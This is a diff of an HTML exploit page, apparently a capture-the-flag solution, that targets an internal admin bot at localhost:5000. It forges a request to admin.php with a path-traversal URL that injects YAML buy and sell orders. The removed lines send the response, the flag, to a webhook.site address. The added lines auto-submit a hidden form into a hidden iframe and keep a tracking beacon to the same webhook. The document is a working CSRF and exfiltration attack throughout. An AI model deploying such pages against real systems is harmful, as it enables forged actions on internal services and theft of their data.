@@ -1,25 +1,31 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8">
-  </head>
-  <body>
-    <!-- Optional beacon to verify bot visit -->
-    <img src="https://webhook.site/bb019f0d-32f0-4ed4-bc65-b29a133afa26/beacon">
+<head>
+  <meta charset="utf-8">
+</head>
+<body>
+  <!-- Beacon to confirm visit -->
+  <img src="https://webhook.site/bb019f0d-32f0-4ed4-bc65-b29a133afa26/beacon">
 
-    <script>
-      // Step 1: CSRF the internal admin bot
-      fetch("http://localhost:5000/admin.php", {
-        method: "POST",
-        body: new URLSearchParams({
-          url: "http://localhost:5000/admin.php/../index.php?html=- amount: 1000000\n  currency: ZZZ\n  op: BUY\n- amount: 1000000\n  currency: ZZZ\n  op: SELL\n- amount: 1\n  currency: FL\n  op: BUY"
-        })
-      })
-      .then(res => res.text())
-      .then(data => {
-        // Step 2: Exfiltrate the flag to your webhook
-        fetch("https://webhook.site/bb019f0d-32f0-4ed4-bc65-b29a133afa26?leak=" + encodeURIComponent(data));
-      });
-    </script>
-  </body>
+  <form id="f" action="http://localhost:5000/admin.php" method="POST" target="hiddenFrame">
+    <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=- amount: 1000000
+  currency: ZZZ
+  op: BUY
+- amount: 1000000
+  currency: ZZZ
+  op: SELL
+- amount: 1
+  currency: FL
+  op: BUY">
+  </form>
+
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+  <script>
+    setTimeout(() => {
+      // Auto-submit the form
+      document.getElementById('f').submit();
+    }, 1000);
+  </script>
+</body>
 </html>
